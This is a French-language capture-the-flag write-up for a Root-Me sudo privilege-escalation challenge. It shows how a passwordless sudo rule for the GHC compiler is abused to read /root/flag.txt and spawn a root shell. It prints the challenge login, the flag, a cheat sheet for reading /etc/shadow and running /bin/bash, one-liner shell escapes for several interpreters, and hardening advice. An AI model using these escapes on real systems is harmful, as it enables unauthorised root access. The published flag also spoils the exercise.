# Linux Privesc - Sudo (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32868
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32868
```

---

## Objectif

Le serveur a besoin de compiler du code Haskell régulièrement. L'administrateur système a configuré des permissions spéciales pour cette tâche. Exploiter cette configuration pour lire `/root/flag.txt`.

---

## Reconnaissance

### Vérification des permissions sudo

```bash
user@challenge:~$ sudo -l
Matching Defaults entries for user on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User user may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/ghc
```

### Analyse

| Élément | Valeur | Description |
|---------|--------|-------------|
| Utilisateur | root | Exécution en tant que root |
| NOPASSWD | Oui | Pas de mot de passe requis |
| Commande | /usr/bin/ghc | Glasgow Haskell Compiler |

---

## GHC - Glasgow Haskell Compiler

### Qu'est-ce que GHC ?

GHC (Glasgow Haskell Compiler) est le compilateur principal pour le langage de programmation Haskell. Il peut :
- Compiler des fichiers `.hs`
- Exécuter des expressions Haskell directement avec `-e`
- Lancer un interpréteur interactif (GHCi)

### Options dangereuses

| Option | Description | Risque |
|--------|-------------|--------|
| `-e EXPR` | Exécute une expression Haskell | Exécution de code arbitraire |
| `--interactive` | Lance GHCi | Shell interactif Haskell |

---

## Exploitation

### Méthode 1 : Lecture de fichier avec `-e`

```bash
user@challenge:~$ sudo /usr/bin/ghc -e 'readFile "/root/flag.txt" >>= putStrLn'
RM{efecb7cedcff9d305148faac27a87f66}
```

### Explication du code Haskell

```haskell
readFile "/root/flag.txt" >>= putStrLn
│                          │   └── Affiche une String sur stdout
│                          └── Opérateur bind (monade IO)
└── Lit le contenu du fichier et retourne IO String
```

Équivalent en notation do :
```haskell
do
  content <- readFile "/root/flag.txt"
  putStrLn content
```

### Méthode 2 : Shell interactif

```bash
user@challenge:~$ sudo /usr/bin/ghc -e 'System.Process.callCommand "/bin/bash"'
root@challenge:~# cat /root/flag.txt
RM{efecb7cedcff9d305148faac27a87f66}
```

### Méthode 3 : Exécution de commande système

```bash
user@challenge:~$ sudo /usr/bin/ghc -e 'System.Process.callCommand "cat /root/flag.txt"'
RM{efecb7cedcff9d305148faac27a87f66}
```

### Méthode 4 : Via GHCi interactif

```bash
user@challenge:~$ sudo /usr/bin/ghc --interactive
GHCi, version 9.x.x: https://www.haskell.org/ghc/  :? for help
ghci> readFile "/root/flag.txt" >>= putStrLn
RM{efecb7cedcff9d305148faac27a87f66}
ghci> :q
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION SUDO                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  user ALL=(root) NOPASSWD: /usr/bin/ghc                     │
│       │    │               │                                │
│       │    │               └── Compilateur Haskell          │
│       │    └── Exécution en tant que root                   │
│       └── Utilisateur autorisé                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOITATION                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  sudo /usr/bin/ghc -e 'readFile "/root/flag.txt" >>= putStrLn'
│                    │   │                                    │
│                    │   └── Expression Haskell               │
│                    └── Exécute une expression               │
│                                                             │
│  GHC s'exécute en tant que ROOT                             │
│         │                                                   │
│         ▼                                                   │
│  readFile lit /root/flag.txt avec les droits root           │
│         │                                                   │
│         ▼                                                   │
│  putStrLn affiche: RM{efecb7cedcff9d305148faac27a87f66}     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{efecb7cedcff9d305148faac27a87f66}
```

---

## Fonctions Haskell utiles pour l'exploitation

### Lecture/Écriture de fichiers

```haskell
-- Lire un fichier
readFile "/etc/shadow" >>= putStrLn

-- Écrire dans un fichier
writeFile "/tmp/test.txt" "contenu"

-- Ajouter à un fichier
appendFile "/tmp/test.txt" "ajout"
```

### Exécution de commandes système

```haskell
-- Importer le module (si nécessaire)
import System.Process

-- Exécuter une commande
callCommand "id"
callCommand "cat /etc/passwd"
callCommand "/bin/bash"

-- Avec capture de sortie
readProcess "cat" ["/root/flag.txt"] ""
```

### Shell interactif

```haskell
-- Lancer un shell bash
System.Process.callCommand "/bin/bash"

-- Ou via system
System.Posix.Process.executeFile "/bin/sh" True [] Nothing
```

---

## GTFOBins - GHC

Référence : https://gtfobins.github.io/gtfobins/ghc/

```bash
# Lecture de fichier
ghc -e 'readFile "/etc/passwd" >>= putStrLn'

# Shell interactif
ghc -e 'System.Process.callCommand "/bin/sh"'

# Avec sudo
sudo ghc -e 'readFile "/root/flag.txt" >>= putStrLn'
```

---

## Autres langages avec des vulnérabilités similaires

| Langage | Commande | Exploitation |
|---------|----------|--------------|
| Python | `python -c` | `import os; os.system("/bin/bash")` |
| Perl | `perl -e` | `exec "/bin/bash"` |
| Ruby | `ruby -e` | `exec "/bin/bash"` |
| Lua | `lua -e` | `os.execute("/bin/bash")` |
| PHP | `php -r` | `system("/bin/bash")` |
| Node.js | `node -e` | `require("child_process").spawn("/bin/bash")` |
| GHC | `ghc -e` | `System.Process.callCommand "/bin/bash"` |

---

## Comment sécuriser

### 1. Éviter d'autoriser des interpréteurs/compilateurs

```bash
# MAUVAIS
user ALL=(root) NOPASSWD: /usr/bin/ghc
user ALL=(root) NOPASSWD: /usr/bin/python3
user ALL=(root) NOPASSWD: /usr/bin/perl

# Ces programmes permettent tous l'exécution de code arbitraire
```

### 2. Si nécessaire, utiliser un wrapper sécurisé

```bash
#!/bin/bash
# /usr/local/bin/safe-ghc-compile
# Compile uniquement des fichiers .hs dans un répertoire spécifique

FILE="$1"
ALLOWED_DIR="/home/user/haskell"

if [[ "$FILE" != "$ALLOWED_DIR"/*.hs ]]; then
    echo "Erreur: Seuls les fichiers .hs dans $ALLOWED_DIR sont autorisés"
    exit 1
fi

/usr/bin/ghc -c "$FILE"
```

### 3. Utiliser NOEXEC (limité)

```
user ALL=(root) NOEXEC: /usr/bin/ghc
```

Note : NOEXEC peut ne pas fonctionner avec tous les interpréteurs.

---

## Commandes utiles

```bash
# Vérifier les permissions sudo
sudo -l

# Tester ghc
ghc --version
ghc -e 'putStrLn "Hello"'

# Rechercher sur GTFOBins
# https://gtfobins.github.io/

# Chercher des binaires avec sudo
cat /etc/sudoers 2>/dev/null
sudo -l
```

---

## Ressources

- [GTFOBins - GHC](https://gtfobins.github.io/gtfobins/ghc/)
- [Haskell Documentation](https://www.haskell.org/documentation/)
- [GHC User Guide](https://downloads.haskell.org/ghc/latest/docs/users_guide/)
- `man ghc` - Manuel GHC
